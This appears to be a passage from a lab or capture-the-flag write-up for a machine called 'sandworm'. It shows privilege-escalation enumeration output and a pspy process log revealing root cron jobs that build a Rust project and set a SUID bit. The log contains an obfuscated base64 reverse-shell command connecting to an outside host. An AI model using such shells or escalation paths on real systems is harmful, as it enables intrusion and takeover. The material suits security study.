/opt/crates/logger/target/debug/build/num-traits-09ce1320563f1729/output
/opt/crates/logger/target/debug/build/libc-85bfbc0004d699f9
/opt/crates/logger/target/debug/build/libc-85bfbc0004d699f9/stderr
/opt/crates/logger/target/debug/build/libc-85bfbc0004d699f9/invoked.timestamp
/opt/crates/logger/target/debug/build/libc-85bfbc0004d699f9/out
/opt/crates/logger/target/debug/build/libc-85bfbc0004d699f9/root-output
/opt/crates/logger/target/debug/build/libc-85bfbc0004d699f9/output
/opt/crates/logger/target/debug/build/num-traits-054271c35184efb6
/opt/crates/logger/target/debug/build/num-traits-054271c35184efb6/build-script-build
/opt/crates/logger/target/debug/build/num-traits-054271c35184efb6/build_script_build-054271c35184efb6.d
/opt/crates/logger/target/debug/build/num-traits-054271c35184efb6/build_script_build-054271c35184efb6
/opt/crates/logger/target/debug/examples
/opt/crates/logger/target/debug/deps
/opt/crates/logger/target/debug/deps/time-9436ff2a3ed7b95b.d
/opt/crates/logger/target/debug/deps/libc-c54205ffac66e97a.d
/opt/crates/logger/target/debug/deps/logger-d0ec122b4978c5b5.d
/opt/crates/logger/target/debug/deps/libtime-9436ff2a3ed7b95b.rmeta
/opt/crates/logger/target/debug/deps/iana_time_zone-7aac1b520ad2eb1f.d
#)You_can_write_even_more_files_inside_last_directory

/opt/crates/logger/target/debug/liblogger.rlib
/opt/crates/logger/target/debug/incremental
/opt/crates/logger/target/debug/incremental/logger-16l10cpwxmikv
/opt/crates/logger/target/debug/incremental/logger-16l10cpwxmikv/s-gkngn1ezwn-1qwt1k7-rv25v9d2xrqf
/opt/crates/logger/target/debug/incremental/logger-16l10cpwxmikv/s-gkngn1ezwn-1qwt1k7-rv25v9d2xrqf/query-cache.bin
/opt/crates/logger/target/debug/incremental/logger-16l10cpwxmikv/s-gkngn1ezwn-1qwt1k7-rv25v9d2xrqf/work-products.bin
/opt/crates/logger/target/debug/incremental/logger-16l10cpwxmikv/s-gkngn1ezwn-1qwt1k7-rv25v9d2xrqf/dep-graph.bin
/opt/crates/logger/target/debug/incremental/logger-16l10cpwxmikv/s-gkngn1ezwn-1qwt1k7-rv25v9d2xrqf/49k60jy3m1d6pwzq.o
/opt/crates/logger/target/debug/incremental/logger-2jmeim557iqyj
/opt/crates/logger/target/debug/incremental/logger-2jmeim557iqyj/s-gkngr1xa84-1hq9ijz-eg92mkt9tcd7
/opt/crates/logger/target/debug/incremental/logger-2jmeim557iqyj/s-gkngr1xa84-1hq9ijz-eg92mkt9tcd7/2x7k16mja2azfsop.o
/opt/crates/logger/target/debug/incremental/logger-2jmeim557iqyj/s-gkngr1xa84-1hq9ijz-eg92mkt9tcd7/f6i3bax9e7doz58.o
/opt/crates/logger/target/debug/incremental/logger-2jmeim557iqyj/s-gkngr1xa84-1hq9ijz-eg92mkt9tcd7/4vufgf0qbknj4x8t.o
/opt/crates/logger/target/debug/incremental/logger-2jmeim557iqyj/s-gkngr1xa84-1hq9ijz-eg92mkt9tcd7/l9d3tyk598o0lng.o
/opt/crates/logger/target/debug/incremental/logger-2jmeim557iqyj/s-gkngr1xa84-1hq9ijz-eg92mkt9tcd7/2s7he0okzzmkeeo0.o
#)You_can_write_even_more_files_inside_last_directory

/opt/crates/logger/src
/opt/crates/logger/src/lib.rs

 ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
 ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-06-06+12:27:21.2341763860 /usr/local/sbin/laurel
2023-06-06+09:04:49.6751756730 /opt/tipnet/target/debug/build/native-tls-ffa598d30b3d77a6/build_script_build-ffa598d30b3d77a6
2023-06-06+09:04:49.6751756730 /opt/tipnet/target/debug/build/native-tls-ffa598d30b3d77a6/build-script-build
2023-06-06+09:04:46.3191826440 /opt/tipnet/target/debug/build/io-enum-011249f210b975ac/build_script_build-011249f210b975ac
2023-06-06+09:04:46.3191826440 /opt/tipnet/target/debug/build/io-enum-011249f210b975ac/build-script-build
2023-06-06+09:04:37.2472006450 /opt/tipnet/target/debug/deps/libthiserror_impl-451617f089ec790a.so
2023-06-06+09:04:22.6472280510 /opt/tipnet/target/debug/deps/libfrunk_derives-7ae1da3c903b58f5.so
2023-06-06+09:04:20.6352315610 /opt/tipnet/target/debug/deps/libopenssl_macros-a7ea67685af3831b.so
2023-06-06+09:03:56.6952703760 /opt/tipnet/target/debug/build/mysql_common-c31e656c1eadcb65/build_script_build-c31e656c1eadcb65
2023-06-06+09:03:56.6952703760 /opt/tipnet/target/debug/build/mysql_common-c31e656c1eadcb65/build-script-build
2023-06-06+09:03:52.3432768520 /opt/tipnet/target/debug/build/rust_decimal-039d5f8f1c526771/build_script_build-039d5f8f1c526771
2023-06-06+09:03:52.3432768520 /opt/tipnet/target/debug/build/rust_decimal-039d5f8f1c526771/build-script-build
2023-06-06+09:03:50.1312798620 /opt/tipnet/target/debug/build/crossbeam-queue-ef4a6c84aaba7c7b/build_script_build-ef4a6c84aaba7c7b
2023-06-06+09:03:50.1312798620 /opt/tipnet/target/debug/build/crossbeam-queue-ef4a6c84aaba7c7b/build-script-build
2023-06-06+09:03:47.1392840400 /opt/tipnet/target/debug/build/thiserror-b8820a5d17e0b3c5/build_script_build-b8820a5d17e0b3c5
2023-06-06+09:03:47.1392840400 /opt/tipnet/target/debug/build/thiserror-b8820a5d17e0b3c5/build-script-build
2023-06-06+09:03:45.1352867150 /opt/tipnet/target/debug/build/log-ff9463ec8ab06410/build_script_build-ff9463ec8ab06410
2023-06-06+09:03:45.1352867150 /opt/tipnet/target/debug/build/log-ff9463ec8ab06410/build-script-build
2023-06-06+09:03:44.1312879360 /opt/tipnet/target/debug/build/serde_json-22149c4aeaa972fb/build_script_build-22149c4aeaa972fb
2023-06-06+09:03:44.1312879360 /opt/tipnet/target/debug/build/serde_json-22149c4aeaa972fb/build-script-build
2023-06-06+09:03:41.7912910740 /opt/tipnet/target/debug/build/openssl-98cb81c8a981a9c4/build_script_build-98cb81c8a981a9c4
2023-06-06+09:03:41.7912910740 /opt/tipnet/target/debug/build/openssl-98cb81c8a981a9c4/build-script-build
2023-06-06+09:02:58.7273352040 /opt/tipnet/target/debug/deps/libfrunk_proc_macros_impl-70b8a9b0743718dd.so
2023-06-06+09:02:47.3993427600 /opt/tipnet/target/debug/build/crc32fast-3a962b51032ba04b/build_script_build-3a962b51032ba04b
2023-06-06+09:02:47.3993427600 /opt/tipnet/target/debug/build/crc32fast-3a962b51032ba04b/build-script-build
2023-06-06+09:02:46.4913432420 /opt/tipnet/target/debug/build/radium-6e1c80ef27594346/build_script_build-6e1c80ef27594346
2023-06-06+09:02:46.4913432420 /opt/tipnet/target/debug/build/radium-6e1c80ef27594346/build-script-build
2023-06-06+09:02:43.2873449690 /opt/tipnet/target/debug/build/crossbeam-epoch-bbc25096414404da/build_script_build-bbc25096414404da
2023-06-06+09:02:43.2873449690 /opt/tipnet/target/debug/build/crossbeam-epoch-bbc25096414404da/build-script-build
2023-06-06+09:02:42.3273454270 /opt/tipnet/target/debug/build/num-bigint-80c45158563effe8/build_script_build-80c45158563effe8
2023-06-06+09:02:42.3273454270 /opt/tipnet/target/debug/build/num-bigint-80c45158563effe8/build-script-build
2023-06-06+09:02:41.3793460110 /opt/tipnet/target/debug/build/libz-sys-d913944b0b222f9c/build_script_build-d913944b0b222f9c
2023-06-06+09:02:41.3793460110 /opt/tipnet/target/debug/build/libz-sys-d913944b0b222f9c/build-script-build
2023-06-06+09:02:41.3073460470 /opt/tipnet/target/debug/build/ahash-b8e0c13730adb10f/build_script_build-b8e0c13730adb10f
2023-06-06+09:02:41.3073460470 /opt/tipnet/target/debug/build/ahash-b8e0c13730adb10f/build-script-build
2023-06-06+09:02:38.8993472210 /opt/tipnet/target/debug/deps/libproc_macro_hack-338079cfd6e0fab0.so
2023-06-06+09:01:49.3233526430 /opt/tipnet/target/debug/build/bindgen-942dd9ddb582c6c7/build_script_build-942dd9ddb582c6c7
2023-06-06+09:01:49.3233526430 /opt/tipnet/target/debug/build/bindgen-942dd9ddb582c6c7/build-script-build
2023-06-06+09:01:48.1273523420 /opt/tipnet/target/debug/build/serde-053745b1dd5787e3/build_script_build-053745b1dd5787e3
2023-06-06+09:01:48.1273523420 /opt/tipnet/target/debug/build/serde-053745b1dd5787e3/build-script-build
2023-06-06+09:01:47.6553521440 /opt/tipnet/target/debug/build/memchr-502db78709902300/build_script_build-502db78709902300
2023-06-06+09:01:47.6553521440 /opt/tipnet/target/debug/build/memchr-502db78709902300/build-script-build
2023-06-06+09:01:45.2353514060 /opt/tipnet/target/debug/build/memoffset-ba3486e94bf79900/build_script_build-ba3486e94bf79900
2023-06-06+09:01:45.2353514060 /opt/tipnet/target/debug/build/memoffset-ba3486e94bf79900/build-script-build
2023-06-06+09:01:29.6153444480 /opt/tipnet/target/debug/build/proc-macro-hack-f2350608b88a8421/build_script_build-f2350608b88a8421
2023-06-06+09:01:29.6153444480 /opt/tipnet/target/debug/build/proc-macro-hack-f2350608b88a8421/build-script-build
2023-06-06+09:01:26.1233423630 /opt/tipnet/target/debug/build/openssl-sys-a9d0beb7bded8fa0/build_script_main-a9d0beb7bded8fa0
2023-06-06+09:01:26.1233423630 /opt/tipnet/target/debug/build/openssl-sys-a9d0beb7bded8fa0/build-script-main
2023-06-06+09:01:19.4753378290 /opt/tipnet/target/debug/build/crossbeam-utils-96ced3ece230a988/build_script_build-96ced3ece230a988
2023-06-06+09:01:19.4753378290 /opt/tipnet/target/debug/build/crossbeam-utils-96ced3ece230a988/build-script-build
2023-06-06+09:01:17.5233363890 /opt/tipnet/target/debug/build/num-integer-d392f433a27a7e8f/build_script_build-d392f433a27a7e8f
2023-06-06+09:01:17.5233363890 /opt/tipnet/target/debug/build/num-integer-d392f433a27a7e8f/build-script-build
2023-06-06+09:01:09.4673296210 /opt/tipnet/target/debug/build/clang-sys-1cc8cae5b70fdb56/build_script_build-1cc8cae5b70fdb56
2023-06-06+09:01:09.4673296210 /opt/tipnet/target/debug/build/clang-sys-1cc8cae5b70fdb56/build-script-build
2023-06-06+09:01:05.7473261870 /opt/tipnet/target/debug/build/libc-279cc61ca8877276/build_script_build-279cc61ca8877276
2023-06-06+09:01:05.7473261870 /opt/tipnet/target/debug/build/libc-279cc61ca8877276/build-script-build
2023-06-06+09:01:01.3793218140 /opt/tipnet/target/debug/build/memchr-184f1ae267187935/build_script_build-184f1ae267187935
2023-06-06+09:01:01.3793218140 /opt/tipnet/target/debug/build/memchr-184f1ae267187935/build-script-build
2023-06-06+09:00:48.9193075680 /opt/tipnet/target/debug/build/num-traits-7fd62de46f3f8911/build_script_build-7fd62de46f3f8911
2023-06-06+09:00:48.9193075680 /opt/tipnet/target/debug/build/num-traits-7fd62de46f3f8911/build-script-build
2023-06-06+09:00:34.4992878130 /opt/tipnet/target/debug/build/generic-array-d325ee8e5ee2eb41/build_script_build-d325ee8e5ee2eb41
2023-06-06+09:00:34.4992878130 /opt/tipnet/target/debug/build/generic-array-d325ee8e5ee2eb41/build-script-build
2023-06-06+09:00:30.9232822170 /opt/tipnet/target/debug/build/typenum-c232b56f3520f8b9/build_script_main-c232b56f3520f8b9
2023-06-06+09:00:30.9232822170 /opt/tipnet/target/debug/build/typenum-c232b56f3520f8b9/build-script-main
2023-06-06+09:00:14.1952534090 /opt/tipnet/target/debug/build/syn-7725592242a0df22/build_script_build-7725592242a0df22
2023-06-06+09:00:14.1952534090 /opt/tipnet/target/debug/build/syn-7725592242a0df22/build-script-build
2023-06-06+09:00:03.0592313750 /opt/tipnet/target/debug/build/libc-8970438a9de4df5b/build_script_build-8970438a9de4df5b
2023-06-06+09:00:03.0592313750 /opt/tipnet/target/debug/build/libc-8970438a9de4df5b/build-script-build
2023-06-06+09:00:03.0432313410 /opt/tipnet/target/debug/build/quote-bb19dfe6e14f8031/build_script_build-bb19dfe6e14f8031
2023-06-06+09:00:03.0432313410 /opt/tipnet/target/debug/build/quote-bb19dfe6e14f8031/build-script-build

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x 4 root root 4096 Jun 21 06:48 .
drwxr-xr-x 19 root root 4096 Jun 7 13:53 ..
drwxr-xr-x 3 root atlas 4096 May 4 17:26 crates
drwxr-xr-x 5 root atlas 4096 Jun 6 11:49 tipnet

...省略
silentobserver@sandworm:/tmp$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

 ██▓███ ██████ ██▓███ ▓██ ██▓
 ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒
 ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░
 ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
 ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░
 ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒
 ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░
 ░░ ░ ░ ░ ░░ ▒ ▒ ░░
 ░ ░ ░
 ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2023/06/21 06:54:53 CMD: UID=1001 PID=42514 | ./pspy64
2023/06/21 06:54:53 CMD: UID=1001 PID=42503 | -bash
2023/06/21 06:54:53 CMD: UID=1001 PID=42502 | sshd: silentobserver@pts/1
2023/06/21 06:54:53 CMD: UID=0 PID=42446 | sshd: silentobserver [priv]
2023/06/21 06:54:53 CMD: UID=1001 PID=31974 | /usr/bin/gpg-agent --supervised
2023/06/21 06:54:53 CMD: UID=0 PID=31957 |
2023/06/21 06:54:53 CMD: UID=0 PID=23463 |
2023/06/21 06:54:53 CMD: UID=0 PID=23199 |
2023/06/21 06:54:53 CMD: UID=0 PID=23198 |
2023/06/21 06:54:53 CMD: UID=1001 PID=23033 | -bash
2023/06/21 06:54:53 CMD: UID=1001 PID=23030 | sshd: silentobserver@pts/0
2023/06/21 06:54:53 CMD: UID=1001 PID=22946 | (sd-pam)
2023/06/21 06:54:53 CMD: UID=1001 PID=22945 | /lib/systemd/systemd --user
2023/06/21 06:54:53 CMD: UID=0 PID=22923 | sshd: silentobserver [priv]
2023/06/21 06:54:53 CMD: UID=0 PID=22622 |
2023/06/21 06:54:53 CMD: UID=1000 PID=21716 |
2023/06/21 06:54:53 CMD: UID=1000 PID=21544 | bash -i
2023/06/21 06:54:53 CMD: UID=1000 PID=21543 | bash
2023/06/21 06:54:53 CMD: UID=1000 PID=21540 | /bin/sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash
2023/06/21 06:54:53 CMD: UID=1000 PID=21467 | python3 -c import glob; print([p for p in glob.glob('/**/*', recursive=True)])
2023/06/21 06:54:53 CMD: UID=1000 PID=21313 | bash -i
2023/06/21 06:54:53 CMD: UID=1000 PID=21312 | bash
2023/06/21 06:54:53 CMD: UID=1000 PID=21309 | /bin/sh -c echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMTQvNDQ0NCAwPiYx | base64 -d | bash
2023/06/21 06:54:53 CMD: UID=0 PID=12511 |
2023/06/21 06:54:53 CMD: UID=0 PID=5955 | /usr/libexec/upowerd
2023/06/21 06:54:53 CMD: UID=1000 PID=4418 | scdaemon --multi-server
2023/06/21 06:54:53 CMD: UID=1000 PID=4416 | gpg-agent --homedir /home/atlas/.gnupg --use-standard-socket --daemon
2023/06/21 06:54:53 CMD: UID=0 PID=1417 |
2023/06/21 06:54:53 CMD: UID=114 PID=1234 | /usr/sbin/mysqld
2023/06/21 06:54:53 CMD: UID=1000 PID=1233 | /usr/bin/python3 /usr/local/sbin/flask run
2023/06/21 06:54:53 CMD: UID=33 PID=1221 | nginx: worker process
2023/06/21 06:54:53 CMD: UID=33 PID=1220 | nginx: worker process
2023/06/21 06:54:53 CMD: UID=0 PID=1219 | nginx: master process /usr/sbin/nginx -g daemon on; master_process on;
2023/06/21 06:54:53 CMD: UID=0 PID=1211 | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
2023/06/21 06:54:53 CMD: UID=0 PID=1208 | /sbin/agetty -o -p -- \u --noclear tty1 linux
2023/06/21 06:54:53 CMD: UID=1000 PID=1204 | /usr/local/bin/firejail --profile=webapp flask run
2023/06/21 06:54:53 CMD: UID=0 PID=1186 | /usr/sbin/cron -f -P
2023/06/21 06:54:53 CMD: UID=1000 PID=1182 | /usr/local/bin/firejail --profile=webapp flask run
2023/06/21 06:54:53 CMD: UID=0 PID=1005 | /usr/sbin/ModemManager
2023/06/21 06:54:53 CMD: UID=0 PID=976 | /usr/libexec/udisks2/udisksd
2023/06/21 06:54:53 CMD: UID=0 PID=975 | /lib/systemd/systemd-logind
2023/06/21 06:54:53 CMD: UID=104 PID=974 | /usr/sbin/rsyslogd -n -iNONE
2023/06/21 06:54:53 CMD: UID=0 PID=973 | /usr/libexec/polkitd --no-debug
2023/06/21 06:54:53 CMD: UID=0 PID=972 | /usr/sbin/irqbalance --foreground
2023/06/21 06:54:53 CMD: UID=103 PID=967 | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
2023/06/21 06:54:53 CMD: UID=0 PID=923 | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
2023/06/21 06:54:53 CMD: UID=0 PID=873 |
2023/06/21 06:54:53 CMD: UID=0 PID=840 |
2023/06/21 06:54:53 CMD: UID=997 PID=812 | /usr/local/sbin/laurel --config /etc/laurel/config.toml
2023/06/21 06:54:53 CMD: UID=0 PID=809 | /sbin/auditd
2023/06/21 06:54:53 CMD: UID=0 PID=808 | /usr/bin/vmtoolsd
2023/06/21 06:54:53 CMD: UID=0 PID=807 | /usr/bin/VGAuthService
2023/06/21 06:54:53 CMD: UID=102 PID=806 | /lib/systemd/systemd-timesyncd
2023/06/21 06:54:53 CMD: UID=101 PID=805 | /lib/systemd/systemd-resolved
2023/06/21 06:54:53 CMD: UID=0 PID=750 | /lib/systemd/systemd-udevd
2023/06/21 06:54:53 CMD: UID=0 PID=745 | /sbin/multipathd -d -s
2023/06/21 06:54:53 CMD: UID=0 PID=744 |
2023/06/21 06:54:53 CMD: UID=0 PID=743 |
2023/06/21 06:54:53 CMD: UID=0 PID=740 |
2023/06/21 06:54:53 CMD: UID=0 PID=737 |
2023/06/21 06:54:53 CMD: UID=0 PID=705 | /lib/systemd/systemd-journald
2023/06/21 06:54:53 CMD: UID=0 PID=650 |
2023/06/21 06:54:53 CMD: UID=0 PID=649 |
2023/06/21 06:54:53 CMD: UID=0 PID=381 |
2023/06/21 06:54:53 CMD: UID=0 PID=340 |
2023/06/21 06:54:53 CMD: UID=0 PID=339 |
2023/06/21 06:54:53 CMD: UID=0 PID=311 |
2023/06/21 06:54:53 CMD: UID=0 PID=310 |
2023/06/21 06:54:53 CMD: UID=0 PID=309 |
2023/06/21 06:54:53 CMD: UID=0 PID=308 |
2023/06/21 06:54:53 CMD: UID=0 PID=307 |

...省略

2023/06/21 06:54:53 CMD: UID=0 PID=14 |
2023/06/21 06:54:53 CMD: UID=0 PID=13 |
2023/06/21 06:54:53 CMD: UID=0 PID=12 |
2023/06/21 06:54:53 CMD: UID=0 PID=11 |
2023/06/21 06:54:53 CMD: UID=0 PID=10 |
2023/06/21 06:54:53 CMD: UID=0 PID=8 |
2023/06/21 06:54:53 CMD: UID=0 PID=6 |
2023/06/21 06:54:53 CMD: UID=0 PID=5 |
2023/06/21 06:54:53 CMD: UID=0 PID=4 |
2023/06/21 06:54:53 CMD: UID=0 PID=3 |
2023/06/21 06:54:53 CMD: UID=0 PID=2 |
2023/06/21 06:54:53 CMD: UID=0 PID=1 | /sbin/init maybe-ubiquity
2023/06/21 06:55:01 CMD: UID=0 PID=42523 | /usr/sbin/CRON -f -P
2023/06/21 06:55:01 CMD: UID=0 PID=42524 | /usr/sbin/CRON -f -P
2023/06/21 06:55:01 CMD: UID=0 PID=42526 | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/
2023/06/21 06:55:01 CMD: UID=0 PID=42525 | /bin/bash /root/Cleanup/clean.sh
2023/06/21 06:55:01 CMD: UID=0 PID=42527 | /bin/cp -p /root/Cleanup/admin.json /home/atlas/.config/httpie/sessions/localhost_5000/
2023/06/21 06:55:03 CMD: UID=0 PID=42528 |
2023/06/21 06:55:16 CMD: UID=0 PID=42532 | run-parts --list /etc/dhcp/dhclient-enter-hooks.d
2023/06/21 06:55:16 CMD: UID=0 PID=42531 | /bin/sh /sbin/dhclient-script
2023/06/21 06:55:16 CMD: UID=0 PID=42533 | systemctl is-enabled systemd-resolved
2023/06/21 06:55:16 CMD: UID=0 PID=42534 | ip -4 addr change 10.129.34.14/255.255.0.0 broadcast 10.129.255.255 valid_lft 3600 preferred_lft 3600 dev eth0 label eth0
2023/06/21 06:55:16 CMD: UID=0 PID=42535 | run-parts --list /etc/dhcp/dhclient-exit-hooks.d
2023/06/21 06:55:16 CMD: UID=0 PID=42536 | /bin/sh /sbin/dhclient-script
2023/06/21 06:55:16 CMD: UID=0 PID=42537 | /bin/sh /sbin/dhclient-script
2023/06/21 06:55:16 CMD: UID=0 PID=42538 | ???
2023/06/21 06:55:16 CMD: UID=0 PID=42540 | /bin/sh /sbin/dhclient-script
2023/06/21 06:55:16 CMD: UID=0 PID=42541 | /bin/sh /sbin/dhclient-script
2023/06/21 06:55:16 CMD: UID=0 PID=42542 | /bin/sh /sbin/dhclient-script
2023/06/21 06:55:16 CMD: UID=0 PID=42543 | mktemp
2023/06/21 06:55:16 CMD: UID=0 PID=42544 | md5sum /run/network/isc-dhcp-v4-eth0 /run/network/isc-dhcp-v6-eth0 /run/network/ifupdown-inet-eth0 /run/network/ifupdown-inet6-eth0
2023/06/21 06:55:16 CMD: UID=0 PID=42545 | cmp --silent /tmp/tmp.e3JfBSINNe /tmp/tmp.EExLWMvohC
C2023/06/21 06:56:01 CMD: UID=0 PID=42548 | /usr/sbin/CRON -f -P
2023/06/21 06:56:01 CMD: UID=0 PID=42547 | /usr/sbin/CRON -f -P
2023/06/21 06:56:01 CMD: UID=0 PID=42551 | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 06:56:01 CMD: UID=0 PID=42549 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 06:56:01 CMD: UID=1000 PID=42552 | /usr/bin/cargo run --offline
2023/06/21 06:56:01 CMD: UID=0 PID=42553 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2023/06/21 06:56:01 CMD: UID=0 PID=42554 | sleep 10
2023/06/21 06:56:01 CMD: UID=1000 PID=42555 | /usr/bin/cargo run --offline
2023/06/21 06:56:01 CMD: UID=1000 PID=42556 | /usr/bin/cargo run --offline
2023/06/21 06:56:01 CMD: UID=1000 PID=42558 | /usr/bin/cargo run --offline
2023/06/21 06:56:02 CMD: UID=1000 PID=42560 | rustc -vV
2023/06/21 06:56:11 CMD: UID=0 PID=42566 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2023/06/21 06:56:11 CMD: UID=0 PID=42567 | /bin/rm -r /opt/crates
2023/06/21 06:56:11 CMD: UID=0 PID=42568 | /bin/cp -rp /root/Cleanup/crates /opt/
2023/06/21 06:56:11 CMD: UID=0 PID=42569 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
c2023/06/21 06:58:01 CMD: UID=0 PID=42574 | /usr/sbin/CRON -f -P
2023/06/21 06:58:01 CMD: UID=0 PID=42573 | /usr/sbin/CRON -f -P
2023/06/21 06:58:01 CMD: UID=0 PID=42575 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 06:58:01 CMD: UID=0 PID=42577 | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 06:58:01 CMD: UID=0 PID=42579 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2023/06/21 06:58:01 CMD: UID=0 PID=42578 | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2023/06/21 06:58:01 CMD: UID=1000 PID=42580 | /usr/bin/cargo run --offline
2023/06/21 06:58:01 CMD: UID=1000 PID=42581 | /usr/bin/cargo run --offline
2023/06/21 06:58:01 CMD: UID=1000 PID=42582 | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
2023/06/21 06:58:01 CMD: UID=1000 PID=42584 | /usr/bin/cargo run --offline
2023/06/21 06:58:02 CMD: UID=1000 PID=42587 | /usr/bin/cargo run --offline
2023/06/21 06:58:11 CMD: UID=0 PID=42593 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 06:58:11 CMD: UID=0 PID=42594 | /bin/rm -r /opt/crates
2023/06/21 06:58:11 CMD: UID=0 PID=42595 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 06:59:05 CMD: UID=1001 PID=42597 |
2023/06/21 07:00:01 CMD: UID=0 PID=42606 | /usr/sbin/CRON -f -P
2023/06/21 07:00:01 CMD: UID=0 PID=42605 | /usr/sbin/CRON -f -P
2023/06/21 07:00:01 CMD: UID=0 PID=42604 | /usr/sbin/CRON -f -P
2023/06/21 07:00:01 CMD: UID=0 PID=42607 | /usr/sbin/CRON -f -P
2023/06/21 07:00:01 CMD: UID=0 PID=42609 | /bin/cp -p /root/Cleanup/webapp.profile /home/atlas/.config/firejail/
2023/06/21 07:00:01 CMD: UID=0 PID=42608 | /bin/bash /root/Cleanup/clean.sh
2023/06/21 07:00:01 CMD: UID=0 PID=42613 | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:00:01 CMD: UID=0 PID=42612 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:00:01 CMD: UID=0 PID=42611 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:00:01 CMD: UID=0 PID=42614 | /usr/sbin/CRON -f -P
2023/06/21 07:00:01 CMD: UID=0 PID=42616 | sleep 10
2023/06/21 07:00:01 CMD: UID=1000 PID=42615 | /usr/bin/cargo run --offline
2023/06/21 07:00:02 CMD: UID=1000 PID=42617 | rustc -vV
2023/06/21 07:00:02 CMD: UID=1000 PID=42618 | /usr/bin/cargo run --offline
2023/06/21 07:00:02 CMD: UID=1000 PID=42620 | /usr/bin/cargo run --offline
2023/06/21 07:00:02 CMD: UID=1000 PID=42622 | /usr/bin/cargo run --offline
2023/06/21 07:00:11 CMD: UID=0 PID=42626 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:00:11 CMD: UID=0 PID=42627 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:00:11 CMD: UID=0 PID=42628 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:00:12 CMD: UID=0 PID=42629 | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
^F2023/06/21 07:02:01 CMD: UID=0 PID=42636 | /usr/sbin/CRON -f -P
2023/06/21 07:02:01 CMD: UID=0 PID=42635 | /usr/sbin/CRON -f -P
2023/06/21 07:02:01 CMD: UID=0 PID=42637 |
2023/06/21 07:02:01 CMD: UID=0 PID=42638 | sleep 10
2023/06/21 07:02:01 CMD: UID=0 PID=42639 | /usr/sbin/CRON -f -P
2023/06/21 07:02:01 CMD: UID=0 PID=42641 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:02:01 CMD: UID=0 PID=42640 | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/06/21 07:02:01 CMD: UID=1000 PID=42642 | /usr/bin/cargo run --offline
2023/06/21 07:02:01 CMD: UID=1000 PID=42643 | /usr/bin/cargo run --offline
2023/06/21 07:02:01 CMD: UID=1000 PID=42644 | /usr/bin/cargo run --offline
2023/06/21 07:02:01 CMD: UID=1000 PID=42646 |
2023/06/21 07:02:02 CMD: UID=1000 PID=42648 | rustc -vV
2023/06/21 07:02:11 CMD: UID=0 PID=42652 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:02:11 CMD: UID=0 PID=42653 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:02:11 CMD: UID=0 PID=42654 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:02:11 CMD: UID=0 PID=42655 | /bin/bash /root/Cleanup/clean_c.sh
2023/06/21 07:04:01 CMD: UID=0 PID=42661 | /usr/sbin/CRON -f -P
2023/06/21 07:04:01 CMD: UID=0 PID=42660 | /usr/sbin/CRON -f -P
2023/06/21 07:04:01 CMD: UID=0 PID=42662 | /usr/sbin/CRON -f -P
2023/06/21 07:04:01 CMD: UID=0 PID=42663 | sleep 10
2023/06/21 07:04:01 CMD: UID=0 PID=42664 | /usr/sbin/CRON -f -P
